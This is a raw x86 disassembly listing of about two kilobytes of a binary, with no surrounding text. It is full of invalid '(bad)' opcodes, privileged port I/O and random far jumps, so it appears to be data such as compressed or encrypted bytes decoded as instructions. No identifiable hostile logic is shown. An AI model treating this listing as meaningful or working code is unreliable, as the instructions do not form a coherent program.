  41b3f5:	push   0xa065ecea
  41b3fa:	push   ebx
  41b3fb:	push   ds
  41b3fc:	pop    esi
  41b3fd:	xchg   ecx,eax
  41b3fe:	test   DWORD PTR [edi+0x5a],esp
  41b401:	xchg   edx,eax
  41b402:	cmp    al,0x3e
  41b404:	or     DWORD PTR [ebx],ebp
  41b406:	add    DWORD PTR [ebx-0x1c86b66a],edi
  41b40c:	jns    0x41b482
  41b40e:	repnz mov ebp,0xd40968a2
  41b414:	dec    ebx
  41b415:	dec    edi
  41b416:	xchg   ecx,eax
  41b417:	and    ah,0x90
  41b41a:	xlat   BYTE PTR ds:[ebx]
  41b41b:	clc    
  41b41c:	in     al,0x56
  41b41e:	push   ebp
  41b41f:	mov    eax,fs:0xbb98e9eb
  41b425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b426:	and    eax,0x55fc2361
  41b42b:	and    edi,DWORD PTR [edi+0x6b]
  41b42e:	dec    edx
  41b42f:	out    0x51,eax
  41b431:	ret    
  41b432:	xchg   edx,eax
  41b433:	pop    eax
  41b434:	sub    esp,DWORD PTR [eax+0x30306e9a]
  41b43a:	cmp    ah,cl
  41b43c:	and    DWORD PTR [ebp-0x32],0xdbb6a021
  41b443:	xchg   edx,eax
  41b444:	push   cs
  41b445:	(bad)  
  41b446:	mov    esp,0x400ced23
  41b44b:	repnz sbb edx,ecx
  41b44e:	cmp    al,BYTE PTR [eax+0x3344ed68]
  41b454:	jns    0x41b46e
  41b456:	loope  0x41b3f6
  41b458:	shl    BYTE PTR [eax],1
  41b45a:	and    edi,DWORD PTR [esp+edi*4+0x6878e094]
  41b461:	dec    ebp
  41b462:	cmp    eax,0x66ae4505
  41b467:	scas   al,BYTE PTR es:[edi]
  41b468:	dec    ecx
  41b469:	loop   0x41b4d5
  41b46b:	xor    edx,DWORD PTR [esi]
  41b46d:	ins    BYTE PTR es:[edi],dx
  41b46e:	adc    al,0xc
  41b470:	jmp    0x41b4ed
  41b472:	(bad)  
  41b473:	je     0x41b4bb
  41b475:	mov    eax,0xe34618f
  41b47a:	inc    esi
  41b47b:	and    al,0x1c
  41b47d:	xchg   ecx,eax
  41b47e:	je     0x41b40c
  41b480:	aam    0x5c
  41b482:	or     eax,DWORD PTR [ecx+0x268fc57f]
  41b488:	test   DWORD PTR [ebx-0xa],0x80100360
  41b48f:	aas    
  41b490:	and    eax,0xb8e6e844
  41b495:	cmp    al,0xea
	...
  41b513:	add    BYTE PTR [ebp-0x7f],bl
  41b516:	sub    dl,0xde
  41b519:	jmp    0x41b598
  41b51b:	mov    bh,0xe6
  41b51d:	or     BYTE PTR [eax-0x2e],0xb8
  41b521:	clc    
  41b522:	cmp    BYTE PTR [edi-0x77],dh
  41b525:	push   ebx
  41b526:	add    DWORD PTR [eax],eax
  41b528:	imul   eax,DWORD PTR [edi],0x0
  41b52b:	add    BYTE PTR [eax],bl
  41b52d:	fistp  QWORD PTR [eax+0x224bf9b1]
  41b533:	fst    DWORD PTR [ecx+ebp*8]
  41b536:	mov    dh,BYTE PTR [eax-0x104033b0]
  41b53c:	stc    
  41b53d:	dec    edx
  41b53e:	jns    0x41b50b
  41b540:	loop   0x41b59f
  41b542:	mov    ebp,0xe8f30529
  41b547:	inc    edi
  41b548:	add    eax,0x8a11a720
  41b54d:	outs   dx,DWORD PTR ds:[esi]
  41b54e:	(bad)  
  41b54f:	retf   0x472c
  41b552:	out    0x1b,eax
  41b554:	popa   
  41b555:	and    BYTE PTR [edx+eax*1-0x25],cl
  41b559:	mov    ebp,0x4d798673
  41b55e:	int3   
  41b55f:	sub    ch,bh
  41b561:	(bad)  
  41b562:	xor    esp,DWORD PTR [eax]
  41b564:	icebp  
  41b565:	or     eax,0xa99ba9a2
  41b56a:	pop    eax
  41b56b:	outs   dx,BYTE PTR ds:[esi]
  41b56c:	test   dh,0x18
  41b56f:	stc    
  41b570:	dec    ecx
  41b571:	in     eax,dx
  41b572:	mov    eax,ds:0x6d17ad57
  41b577:	cs dec esp
  41b579:	or     esp,DWORD PTR [esi]
  41b57b:	sbb    DWORD PTR [edx+edi*2+0x3],ecx
  41b57f:	sar    DWORD PTR [edx],cl
  41b581:	fwait
  41b582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b583:	ret    0xd5cd
  41b586:	outs   dx,DWORD PTR ds:[esi]
  41b587:	in     eax,0xdc
  41b589:	push   ss
  41b58a:	mov    bl,0x69
  41b58c:	push   ebp
  41b58d:	shl    al,cl
  41b58f:	ds das 
  41b591:	xchg   esp,eax
  41b592:	and    bh,BYTE PTR [edx+ebx*1]
  41b595:	dec    edi
  41b596:	not    ebx
  41b598:	imul   esi,DWORD PTR [edx+ebx*4],0x53
  41b59c:	cmp    DWORD PTR [esi-0x65e415e0],eax
  41b5a2:	dec    ebx
  41b5a3:	push   ecx
  41b5a4:	xor    BYTE PTR [ebx+0x594cbaab],0xc7
  41b5ab:	add    DWORD PTR [eax-0x14],0x26
  41b5af:	or     ebx,esp
  41b5b1:	cmp    ebx,DWORD PTR [esi]
  41b5b3:	pop    edx
  41b5b4:	sbb    BYTE PTR [ebx],ah
  41b5b6:	mov    WORD PTR [ebp+0xe0f46bd],?
  41b5bc:	fld    TBYTE PTR [ecx+0x5cead553]
  41b5c2:	mov    edi,0xd94e7f14
  41b5c7:	not    dh
  41b5c9:	sub    ecx,DWORD PTR [bp+si]
  41b5cc:	out    0xd4,al
  41b5ce:	(bad)  
  41b5cf:	in     al,0x59
  41b5d1:	fstp   DWORD PTR [ebp-0x12]
  41b5d4:	std    
  41b5d5:	sbb    dh,ch
  41b5d7:	(bad)  
  41b5d8:	(bad)  
  41b5d9:	cmp    DWORD PTR [edx+0x2d],ecx
  41b5dc:	call   FWORD PTR [ebx+0x5b0b773b]
  41b5e2:	icebp  
  41b5e3:	pop    es
  41b5e4:	adc    eax,0xf7a957aa
  41b5e9:	adc    edi,0xffffff8b
  41b5ec:	cmp    bh,dh
  41b5ee:	cmovbe eax,DWORD PTR [ecx+0x7c]
  41b5f2:	int    0xf4
  41b5f4:	das    
  41b5f5:	test   eax,0x681c038c
  41b5fa:	lock cwde 
  41b5fc:	test   al,0xb8
  41b5fe:	in     eax,dx
  41b5ff:	mov    edx,0xac557c7e
  41b604:	imul   esp,DWORD PTR [ebx+0x2d3e8088],0xf4f0be03
  41b60e:	shl    DWORD PTR [edi+0x1fc12fba],0x14
  41b615:	cmp    DWORD PTR [edi],0x2e
  41b618:	push   eax
  41b619:	sub    eax,0xa04ae747
  41b61e:	cs fdiv st,st(0)
  41b621:	jle    0x41b612
  41b623:	push   edx
  41b624:	not    dl
  41b626:	jle    0x41b60e
  41b628:	pop    edi
  41b629:	adc    DWORD PTR [edx],ebp
  41b62b:	mov    edx,0x8dbd70c9
  41b630:	xchg   edx,eax
  41b631:	nop
  41b632:	sahf   
  41b633:	out    0xb8,eax
  41b635:	or     al,0x68
  41b637:	sahf   
  41b638:	add    BYTE PTR [esi-0x2ab75910],0x68
  41b63f:	mov    dl,0xf6
  41b641:	or     BYTE PTR [edi+0x4f],dh
  41b644:	mov    ch,0x5f
  41b646:	scas   eax,DWORD PTR es:[edi]
  41b647:	jg     0x41b5ef
  41b649:	clc    
  41b64a:	or     eax,0xf8abc4ea
  41b64f:	pop    edx
  41b650:	mov    edi,0x912b531e
  41b655:	std    
  41b656:	out    0xd2,eax
  41b658:	lds    eax,FWORD PTR [ecx-0x1b]
  41b65b:	mov    al,0x50
  41b65d:	or     eax,0xdb40f58c
  41b662:	shl    DWORD PTR [edi],1
  41b664:	jecxz  0x41b640
  41b666:	push   eax
  41b667:	dec    esp
  41b668:	lods   eax,DWORD PTR ds:[esi]
  41b669:	inc    esi
  41b66a:	rcr    DWORD PTR [esi+0x3f92307a],1
  41b670:	sub    DWORD PTR ds:0xfec9bafb,0x608bf217
  41b67a:	jmp    0x41b67c
  41b67c:	jl     0x41b686
  41b67e:	xchg   edx,eax
  41b67f:	shl    BYTE PTR [eax+esi*2+0x32],0x1e
  41b684:	fiadd  WORD PTR [ebx+ebx*1+0x14]
  41b688:	adc    DWORD PTR ds:0xcc68ae79,ebp
  41b68e:	mov    al,0x48
  41b690:	and    DWORD PTR ds:0x484b3daa,ebx
  41b696:	xchg   ecx,eax
  41b697:	int    0xbc
  41b699:	repnz mov edi,0x50e92122
  41b69f:	adc    eax,0x8eeb3f4b
  41b6a4:	rcr    DWORD PTR [edx],1
  41b6a6:	(bad)  
  41b6a7:	pop    esp
  41b6a8:	or     al,0xda
  41b6aa:	add    DWORD PTR [ebp-0x1b],0x9ed603f0
  41b6b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b2:	xchg   ebx,eax
  41b6b3:	outs   dx,DWORD PTR ds:[esi]
  41b6b4:	or     ah,BYTE PTR [edx-0x4e]
  41b6b7:	xchg   DWORD PTR es:[ebx-0x5c],eax
  41b6bb:	imul   BYTE PTR [ecx]
  41b6bd:	dec    eax
  41b6be:	lea    esp,[eax]
  41b6c0:	push   edx
  41b6c1:	repnz xchg esp,eax
  41b6c3:	mov    ah,0xa5
  41b6c5:	test   eax,0x61bfbad4
  41b6ca:	jge    0x41b660
  41b6cc:	retf   
  41b6cd:	pop    ecx
  41b6ce:	jmp    0x41b6cb
  41b6d0:	dec    esi
  41b6d1:	ror    ebx,1
  41b6d3:	cs cli 
  41b6d5:	sbb    esi,eax
  41b6d7:	inc    edi
  41b6d8:	and    eax,0x4aee7629
  41b6dd:	inc    ecx
  41b6de:	mov    ah,0xf1
  41b6e0:	sbb    al,BYTE PTR [esi-0x59]
  41b6e3:	or     bl,al
  41b6e5:	add    eax,0x31baa3f5
  41b6ea:	js     0x41b688
  41b6ec:	in     al,dx
  41b6ed:	and    eax,0x5d5c2bcc
  41b6f2:	mov    bh,0x94
  41b6f4:	pop    ebp
  41b6f5:	cmp    BYTE PTR [eax-0x2c],0x8e
  41b6f9:	xor    al,0x60
  41b6fb:	or     ebx,esp
  41b6fd:	lea    ecx,[edi+0x1f]
  41b700:	dec    esp
  41b701:	inc    edi
  41b702:	add    eax,DWORD PTR [ebx]
  41b704:	lahf   
  41b705:	stos   BYTE PTR es:[edi],al
  41b706:	int3   
  41b707:	popf   
  41b708:	and    BYTE PTR [eax],ch
  41b70a:	mov    edx,0xad1c8f8b
  41b70f:	sub    esp,DWORD PTR [ebx]
  41b711:	fcmovnb st,st(7)
  41b713:	jle    0x41b72d
  41b715:	cmp    eax,0xa85f5da7
  41b71a:	push   edx
  41b71b:	inc    edi
  41b71c:	cmp    eax,esi
  41b71e:	iret   
  41b71f:	test   al,0x90
  41b721:	repz inc eax
  41b723:	aas    
  41b724:	clc    
  41b725:	sti    
  41b726:	mov    ah,0xc1
  41b728:	jbe    0x41b770
  41b72a:	retf   
  41b72b:	mov    ds:0x9d4738f6,eax
  41b730:	inc    edi
  41b731:	inc    ecx
  41b732:	lock mov esi,0x3043e36e
  41b738:	(bad)  
  41b739:	pop    ecx
  41b73a:	shl    BYTE PTR [edx+0x5c6e43fb],cl
  41b740:	pop    ebp
  41b741:	fnstsw WORD PTR [ecx-0x69bbce38]
  41b747:	push   ecx
  41b748:	or     eax,0x19082e9f
  41b74d:	test   al,0x75
  41b74f:	pop    ebp
  41b750:	pusha  
  41b751:	xchg   BYTE PTR [eax+esi*1+0x5249bbe5],bl
  41b758:	cmp    DWORD PTR [eax],eax
  41b75a:	sbb    dl,BYTE PTR [ecx-0x5f]
  41b75d:	cdq    
  41b75e:	loopne 0x41b7cd
  41b760:	cs add dh,ch
  41b763:	fadd   DWORD PTR [eax-0xc]
  41b766:	sbb    eax,0xff8bbe4d
  41b76b:	pop    ebx
  41b76c:	icebp  
  41b76d:	repnz enter 0x4392,0xdc
  41b772:	pop    ebp
  41b773:	data16 mov al,ds:0x266b2eba
  41b779:	dec    ebx
  41b77a:	jae    0x41b704
  41b77c:	aaa    
  41b77d:	fucomp st(5)
  41b77f:	aam    0xe
  41b781:	mov    edx,0xdedd80c2
  41b786:	fimul  WORD PTR [ecx+0x4f]
  41b789:	pushf  
  41b78a:	outs   dx,DWORD PTR ds:[esi]
  41b78b:	push   ss
  41b78c:	leave  
  41b78d:	jo     0x41b790
  41b78f:	cmp    BYTE PTR [ecx],ah
  41b791:	test   eax,0x30739d12
  41b796:	cmp    DWORD PTR [ecx+0x3b6a48ef],0x51
  41b79d:	jg     0x41b760
  41b79f:	hlt    
  41b7a0:	(bad)  
  41b7a1:	int3   
  41b7a2:	mov    ch,0x48
  41b7a4:	xchg   esp,eax
  41b7a5:	(bad)  
  41b7a7:	(bad)  
  41b7a8:	in     eax,dx
  41b7a9:	xor    dh,BYTE PTR [esi-0x1b52f5fb]
  41b7af:	cmp    ebp,edx
  41b7b1:	jmp    0xecce:0xc5ced45
  41b7b8:	sbb    dl,dh
  41b7ba:	or     ecx,DWORD PTR [ebp+0x78]
  41b7bd:	(bad)  
  41b7be:	mov    edi,0x73afdd1e
  41b7c3:	xor    eax,0x1768218d
  41b7c8:	push   ss
  41b7c9:	sub    BYTE PTR ds:0xe020793f,dh
  41b7cf:	pop    ebx
  41b7d0:	lods   eax,DWORD PTR ds:[esi]
  41b7d1:	jb     0x41b7cb
  41b7d3:	out    dx,eax
  41b7d4:	mov    al,ds:0xb738f46b
  41b7d9:	into   
  41b7da:	in     al,0xe4
  41b7dc:	shl    bh,1
  41b7de:	shr    DWORD PTR [edi+0x4f],0x33
  41b7e2:	cli    
  41b7e3:	mov    esi,0xb65329ff
  41b7e8:	ss stc 
  41b7ea:	mov    esp,ebp
  41b7ec:	push   ss
  41b7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7ee:	jae    0x41b84e
  41b7f0:	jnp    0x41b83e
  41b7f2:	aad    0xff
  41b7f4:	push   0xffffffe9
  41b7f6:	call   0x2dcef6b
  41b7fb:	sbb    esi,esp
  41b7fd:	add    DWORD PTR [edx+0x3df248de],ebp
  41b803:	and    eax,0xbe30beaf
  41b808:	mov    al,ds:0x655c1d18
  41b80d:	mov    ebp,0xe6d5bc86
  41b812:	jmp    0x8bd5:0x5d902c47
  41b819:	mov    edi,0x66edebf
  41b81e:	adc    esp,esp
  41b820:	dec    esi
  41b821:	shl    DWORD PTR [bx+di],cl
  41b824:	sbb    al,0xb4
  41b826:	jae    0x41b895
  41b828:	sub    edi,DWORD PTR gs:[edx-0x4a263706]
  41b82f:	jmp    0x41b7be
  41b831:	xlat   BYTE PTR ds:[ebx]
  41b832:	enter  0xbe1e,0xde
  41b836:	stos   BYTE PTR es:[edi],al
  41b837:	add    BYTE PTR [edi],al
  41b839:	pop    esp
  41b83a:	js     0x41b899
  41b83c:	fidiv  DWORD PTR [esi-0x3c]
  41b83f:	add    eax,0x52fe3573
  41b844:	retf   
  41b845:	lahf   
  41b846:	aaa    
  41b847:	call   FWORD PTR [ecx]
  41b849:	push   edx
  41b84a:	sbb    BYTE PTR [esi],dl
  41b84c:	sbb    BYTE PTR [edi],ch
  41b84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b84f:	and    DWORD PTR cs:[esi+esi*2-0x65a2f469],esi
  41b857:	je     0x41b8b3
  41b859:	jle    0x41b83c
  41b85b:	pop    ebx
  41b85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b85d:	in     eax,0xa6
  41b85f:	ror    BYTE PTR [edi-0x3bbe4a31],0x4e
  41b866:	ja     0x41b81a
  41b868:	std    
  41b869:	mov    ebx,0x5f575701
  41b86e:	mov    al,ds:0xb65945e
  41b873:	and    al,0xc
  41b875:	daa    
  41b876:	jnp    0x41b856
  41b878:	push   ebx
  41b879:	lock adc al,0xc4
  41b87c:	xchg   ebx,eax
  41b87d:	and    al,0xaf
  41b87f:	dec    eax
  41b880:	push   edx
  41b882:	adc    BYTE PTR [ebx+ebp*2-0x6f],bh
  41b886:	xor    dl,BYTE PTR [ebx+0x5201138d]
  41b88c:	mov    ebx,0x792fbfa8
  41b891:	stos   BYTE PTR es:[edi],al
  41b892:	inc    esi
  41b893:	bound  ebx,QWORD PTR ss:0xca885329
  41b89a:	push   es
  41b89b:	mov    ebx,0x5cdd8eba
  41b8a0:	in     al,dx
  41b8a1:	out    dx,eax
  41b8a2:	mov    edx,0x4cbe9e5c
  41b8a7:	mov    cl,0xa4
  41b8a9:	adc    ch,BYTE PTR [ebx-0x2a]
  41b8ac:	call   0x6a2a:0x412f95bd
  41b8b3:	push   eax
  41b8b4:	test   al,0x1c
  41b8b6:	or     DWORD PTR [edi+eiz*1-0x18],esi
  41b8ba:	mov    BYTE PTR [ecx-0x236e5a11],dl
  41b8c0:	push   es
  41b8c1:	inc    eax
  41b8c2:	add    eax,0x8f89e1ea
  41b8c7:	dec    esi
  41b8c8:	or     DWORD PTR [edx+0x3f],esi
  41b8cb:	inc    eax
  41b8cc:	(bad)  
  41b8cd:	aas    
  41b8ce:	retf   
  41b8cf:	mov    ebx,DWORD PTR [ebx+0xc]
  41b8d2:	xlat   BYTE PTR ds:[ebx]
  41b8d3:	fld    TBYTE PTR [ebx+0x6efa0417]
  41b8d9:	adc    eax,0x1e7f90b0
  41b8de:	xor    eax,0x85b78e09
  41b8e3:	mov    edx,DWORD PTR [eax+0x74066a79]
  41b8e9:	call   0x74a69ee8
  41b8ee:	rcl    BYTE PTR [edx],cl
  41b8f0:	mov    edi,0xab124e0d
  41b8f5:	retf   0x4c77
  41b8f8:	push   esi
  41b8f9:	dec    eax
  41b8fa:	lds    esp,FWORD PTR [eax-0x1b7eff0d]
  41b900:	out    0xaa,al
  41b902:	scas   al,BYTE PTR es:[edi]
  41b903:	sub    edi,DWORD PTR [eax-0x4e7ff66e]
  41b909:	int    0xa6
  41b90b:	mov    es,WORD PTR [esi+0x42]
  41b90e:	push   0x4f0dcd59
  41b913:	ins    BYTE PTR es:[edi],dx
  41b914:	jl     0x41b95b
  41b916:	pushf  
  41b917:	sub    eax,0x78afe8b0
  41b91c:	push   ds
  41b91d:	in     al,0xcc
  41b91f:	pop    ecx
  41b920:	adc    DWORD PTR [ebx+0x2c],esi
  41b923:	jecxz  0x41b8d7
  41b925:	push   eax
  41b926:	xchg   BYTE PTR [ebp-0x278c0887],bh
  41b92c:	inc    eax
  41b92d:	ins    BYTE PTR es:[edi],dx
  41b92e:	jno    0x41b958
  41b930:	sbb    DWORD PTR [edi],esp
  41b932:	and    al,0xaa
  41b934:	cmp    esp,esi
  41b936:	mov    esp,DWORD PTR [esi-0x9]
  41b939:	fcom   QWORD PTR ds:0x5d156433
  41b93f:	or     eax,0x66201aaa
  41b944:	fisub  WORD PTR [edi+0x32]
  41b947:	cli    
  41b948:	cmp    al,0xf6
  41b94a:	lahf   
  41b94b:	inc    ecx
  41b94c:	xchg   DWORD PTR [ecx-0x27],eax
  41b94f:	lds    ebp,FWORD PTR [ebp+0x7f316901]
  41b955:	jno    0x41b9a6
  41b957:	mov    eax,0x9633d868
  41b95c:	jecxz  0x41b905
  41b95e:	xchg   esi,eax
  41b95f:	mov    cl,0xb1
  41b961:	push   eax
  41b962:	rol    bh,0xf
  41b965:	sub    dl,BYTE PTR [eax]
  41b967:	hlt    
  41b968:	sbb    BYTE PTR [eax],0xbe
  41b96b:	(bad)  
  41b96c:	cs ja  0x41b8ef
  41b96f:	and    bl,BYTE PTR [edx+ebp*1]
  41b972:	dec    edi
  41b973:	mov    eax,ds:0xb10d54c2
  41b978:	sub    cl,bl
  41b97a:	inc    esi
  41b97b:	nop
  41b97c:	pop    ebp
  41b97d:	loope  0x41b90a
  41b97f:	and    eax,0x9f1725c1
  41b984:	xlat   BYTE PTR ds:[ebx]
  41b985:	ret    0x2a4c
  41b988:	adc    al,0x20
  41b98a:	and    eax,0x537f0d02
  41b98f:	add    BYTE PTR [ebx],0x53
  41b992:	icebp  
  41b993:	(bad)  
  41b994:	cwde   
  41b995:	xchg   edx,eax
  41b996:	dec    esp
  41b997:	xor    ah,0xc3
  41b99a:	repz loopne 0x41b91e
  41b99d:	mov    eax,0xa7f1579a
  41b9a2:	fcmovnb st,st(5)
  41b9a4:	sub    dh,ah
  41b9a6:	int    0x26
  41b9a8:	(bad)  
  41b9a9:	loope  0x41b9b8
  41b9ab:	push   0xd67e77e5
  41b9b0:	icebp  
  41b9b1:	push   eax
  41b9b2:	cmp    BYTE PTR [esi+0x34],ah
  41b9b5:	out    0x10,al
  41b9b7:	cwde   
  41b9b8:	xor    al,BYTE PTR [edi-0x38923e63]
  41b9be:	and    ebp,DWORD PTR [ecx+0x3]
  41b9c1:	sub    BYTE PTR ds:0x8cf3ebfe,ch
  41b9c7:	fwait
  41b9c8:	sar    BYTE PTR [ecx+0x6eb533c],0x45
  41b9cf:	jo     0x41b967
  41b9d1:	loope  0x41ba38
  41b9d3:	iret   
  41b9d4:	loopne 0x41ba3a
  41b9d6:	js     0x41b95d
  41b9d8:	inc    edx
  41b9d9:	shr    BYTE PTR [esi+0x13],1
  41b9dc:	(bad)  [ebp-0x62e74033]
  41b9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e3:	push   edi
  41b9e4:	mov    ebp,0xfe2ced51
  41b9e9:	jg     0x41b979
  41b9eb:	(bad)  
  41b9ec:	pop    ds
  41b9ed:	mov    ebp,0x8225e93b
  41b9f2:	jbe    0x41ba5d
  41b9f4:	jne    0x41ba2d
  41b9f6:	les    edi,FWORD PTR [edx-0x6e]
  41b9f9:	rol    DWORD PTR [ebx+0x51],0x74
  41b9fd:	loope  0x41ba1d
  41b9ff:	addr16 pop ds
  41ba01:	adc    bl,BYTE PTR [eax]
  41ba03:	dec    edi
  41ba04:	xor    al,0x36
  41ba06:	stos   DWORD PTR es:[edi],eax
  41ba07:	push   eax
  41ba08:	shr    DWORD PTR [esi+0x3c],1
  41ba0b:	aam    0xdf
  41ba0d:	fcmovnbe st,st(6)
  41ba0f:	push   0xffffff92
  41ba11:	mov    eax,DWORD PTR [edx+0x26fb019c]
  41ba17:	cmc    
  41ba18:	cmp    eax,0x4bce4de6
  41ba1d:	std    
  41ba1e:	dec    esp
  41ba1f:	xchg   ebp,eax
  41ba20:	pop    ecx
  41ba21:	xor    al,0x43
  41ba23:	sahf   
  41ba24:	(bad)  
  41ba25:	in     eax,dx
  41ba26:	loope  0x41ba35
  41ba28:	or     BYTE PTR [edx],dh
  41ba2a:	addr16 jo 0x41b9f8
  41ba2d:	std    
  41ba2e:	sub    BYTE PTR [esi+ebx*1+0x12],0xf9
  41ba33:	mov    ?,WORD PTR [edi]
  41ba35:	int    0x9d
  41ba37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba38:	adc    al,0xd7
  41ba3a:	dec    edi
  41ba3b:	inc    ebx
  41ba3c:	mov    BYTE PTR [ecx-0x2],bh
  41ba3f:	dec    edx
  41ba40:	loopne 0x41b9ee
  41ba42:	sbb    bh,bh
  41ba44:	pop    esi
  41ba45:	lock and esp,ebp
  41ba48:	mov    ch,0x25
  41ba4a:	scas   eax,DWORD PTR es:[edi]
  41ba4b:	jb     0x41ba40
  41ba4d:	out    dx,al
  41ba4e:	inc    edx
  41ba4f:	in     eax,0xab
  41ba51:	inc    eax
  41ba52:	mov    al,BYTE PTR [eax]
  41ba54:	pop    ds
  41ba55:	sbb    eax,0xc5dd5064
  41ba5a:	pop    esi
  41ba5b:	bound  ecx,QWORD PTR [ecx+0x36]
  41ba5e:	imul   esi,esi,0x5f
  41ba61:	jle    0x41b9fe
  41ba63:	clc    
  41ba64:	push   ss
  41ba65:	jnp    0x41ba84
  41ba67:	dec    edi
  41ba68:	cmp    BYTE PTR [edx],ah
  41ba6a:	cmp    BYTE PTR [edx+0x2e83b7f8],dh
  41ba70:	nop
  41ba71:	jle    0x41ba15
  41ba73:	stos   DWORD PTR es:[edi],eax
  41ba74:	loopne 0x41bac0
  41ba76:	mov    esi,0x9e853da1
  41ba7b:	push   ecx
  41ba7c:	daa    
  41ba7d:	and    DWORD PTR [ebp+0x42],edx
  41ba80:	add    ah,BYTE PTR [esi+0x77]
  41ba83:	(bad)  
  41ba84:	nop
  41ba85:	cmp    BYTE PTR [edi+0x7c88fe61],0xa8
  41ba8c:	pop    es
  41ba8d:	out    0x59,eax
  41ba8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba90:	xchg   esi,eax
  41ba91:	data16 mov dh,0xfe
  41ba94:	adc    al,0xdb
  41ba96:	lahf   
  41ba97:	in     al,0xd
  41ba99:	bound  ebx,QWORD PTR [edi+edi*4]
  41ba9c:	cmc    
  41ba9d:	imul   edi,DWORD PTR [edx+0x33],0xb7a5c41b
  41baa4:	xor    eax,0xbbdf49fd
  41baaa:	out    0x68,eax
  41baac:	mov    ebx,0xa8ba5bd6
  41bab1:	aam    0xf
  41bab3:	sbb    BYTE PTR [eax+edi*4+0x30e554dd],al
  41baba:	push   0x7e7f72f9
  41babf:	mov    ebx,0x64891f69
  41bac4:	pop    esi
  41bac5:	or     cl,BYTE PTR [esi-0x47]
  41bac8:	mov    ecx,0x5c6eb6d1
  41bacd:	leave  
  41bace:	cmp    eax,0x2793fa84
  41bad3:	push   es
  41bad4:	jmp    0x41bb25
  41bad6:	test   BYTE PTR [ebx+0x2f],bl
  41bad9:	std    
  41bada:	ror    DWORD PTR [edx],cl
  41badc:	stos   BYTE PTR es:[edi],al
  41badd:	and    dh,dl
  41badf:	ss sti 
  41bae1:	and    eax,0x8194bffa
  41bae6:	rcr    BYTE PTR [edi],0x5e
  41bae9:	fcomp  DWORD PTR [ebx-0x2426cb91]
  41baef:	mov    eax,ds:0x18164730
  41baf4:	dec    esp
  41baf5:	mov    bl,0x6a
  41baf7:	in     eax,dx
  41baf8:	and    eax,0x794347a7
  41bafd:	rcl    DWORD PTR [ebp+0x58],0x60
  41bb01:	dec    esp
  41bb02:	sbb    al,BYTE PTR [esi+edi*8-0x1a72f14b]
  41bb09:	ins    BYTE PTR es:[edi],dx
  41bb0a:	les    ecx,FWORD PTR [esi-0x6ef4c238]
  41bb10:	add    al,0x18
  41bb12:	pop    edx
  41bb13:	stos   DWORD PTR es:[edi],eax
  41bb14:	repz push cs
  41bb16:	adc    eax,0x54a3a64c
  41bb1b:	test   eax,0xa6e7c716
  41bb20:	mov    edi,0x372f0471
  41bb25:	lods   eax,DWORD PTR ds:[esi]
  41bb26:	jl     0x41bb8f
  41bb28:	cld    
  41bb29:	mov    WORD PTR [esi],gs
  41bb2b:	mov    edx,DWORD PTR [edx-0x53]
  41bb2e:	mov    edx,0x393cfb56
  41bb33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb34:	shr    DWORD PTR [eax],cl
  41bb36:	shl    DWORD PTR [ecx-0x473b144b],cl
  41bb3c:	mov    BYTE PTR [ebx],dl
  41bb3e:	inc    edi
  41bb3f:	jl     0x41bb79
  41bb41:	into   
  41bb42:	xor    ecx,edx
  41bb44:	fldcw  WORD PTR [ecx]
  41bb46:	rcr    dl,0xb1
  41bb49:	sbb    al,0x51
  41bb4b:	adc    DWORD PTR [ebx+0x2ef02c12],edx
  41bb51:	(bad)  
  41bb53:	cmp    al,0x5a
  41bb55:	mov    WORD PTR [esi],ds
  41bb57:	mov    ds:0x537f2285,al
  41bb5c:	fidiv  WORD PTR [ebx]
  41bb5e:	jecxz  0x41bb79
  41bb60:	arpl   WORD PTR [edx],bp
  41bb62:	retf   
  41bb63:	aas    
  41bb64:	xchg   BYTE PTR [edi+esi*4+0x2949b1a1],dh
  41bb6b:	sbb    BYTE PTR [eax-0x416f2af3],al
  41bb71:	jmp    0x41bbdc
  41bb73:	adc    BYTE PTR [ebp+0x25232a82],bl
  41bb79:	pop    es
  41bb7a:	bnd je 0x41bb66
  41bb7d:	loopne 0x41bbb8
  41bb7f:	(bad)  [edx]
  41bb81:	dec    ebx
  41bb82:	mov    ?,WORD PTR [edi+0x72]
  41bb85:	jo     0x41bba6
  41bb87:	sbb    DWORD PTR [edx+0x5b],eax
  41bb8a:	dec    ecx
  41bb8b:	leave  
  41bb8c:	or     esp,DWORD PTR [esi+ebp*8-0x72]
  41bb90:	or     al,0x57
  41bb92:	aas    
  41bb93:	lock out 0xec,al
  41bb96:	shl    BYTE PTR [ebx+0x6b],0x43
  41bb9a:	or     DWORD PTR [edi-0x2a],esi
  41bb9d:	aas    
  41bb9e:	pusha  
  41bb9f:	cmp    al,0x94
  41bba1:	out    0x0,eax
  41bba3:	js     0x41bbfa
  41bba5:	(bad)
  41bba9:	sti    
  41bbaa:	lock jmp 0x6a6d9bdb
  41bbb0:	jg     0x41bbc8
  41bbb2:	xor    al,0x2f
  41bbb4:	push   cs
  41bbb5:	add    bl,ch
  41bbb7:	scas   al,BYTE PTR es:[edi]
  41bbb8:	(bad)  [edx]
  41bbba:	xchg   DWORD PTR [edi+edx*1],esp
  41bbbd:	js     0x41bb43
  41bbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc0:	(bad)  
  41bbc1:	mov    bh,BYTE PTR [eax]
  41bbc3:	dec    esi
  41bbc4:	xor    eax,0xe15a40d4
  41bbc9:	mov    ah,0x86
  41bbcb:	loopne 0x41bbae
  41bbcd:	mov    esi,0x82e037d3
  41bbd2:	and    dl,dh
  41bbd4:	pop    ebp
  41bbd5:	test   BYTE PTR [eax],bh
  41bbd7:	xchg   esp,edx
  41bbd9:	pop    ecx
  41bbda:	les    ebx,FWORD PTR [edi]
  41bbdc:	pop    esi
  41bbdd:	sub    DWORD PTR [edi],ebp
  41bbdf:	test   BYTE PTR [edx+0x3b],cl
  41bbe2:	aaa    
  41bbe3:	daa    
  41bbe4:	int    0x97
  41bbe6:	or     al,ah
  41bbe8:	(bad)  
